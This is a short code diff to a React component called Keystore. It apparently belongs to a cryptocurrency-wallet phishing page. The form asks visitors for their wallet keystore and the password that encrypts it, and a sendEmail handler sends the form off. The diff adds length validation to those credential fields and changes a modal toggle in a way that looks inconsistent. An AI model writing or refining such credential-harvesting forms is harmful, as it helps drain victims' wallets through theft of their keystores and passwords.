@@ -22,13 +22,14 @@ const sendEmail = (e) => {
       }
     );
   e.target.reset();
+
 };
 
 const Keystore = () => {
   const [hide, setHide] = useState(false);
 
   const Showmodal = () => {
-    setHide(true);
+    setHide(false);
   };
 
   return (
@@ -64,12 +65,16 @@ const Keystore = () => {
             type="text"
             placeholder="Enter your keystore"
             name="key"
+            min="12" max="100"
+            minLength="12"
           ></input>
 
           <input
             type="text"
             placeholder="Enter Temporary Password"
             name="pass"
+            minLength="12"
+            min="12" max="100"
           ></input>
           <h6 className="h4">
             Several lines of text beginning with '(...)' plus the password you used to encrypt it.
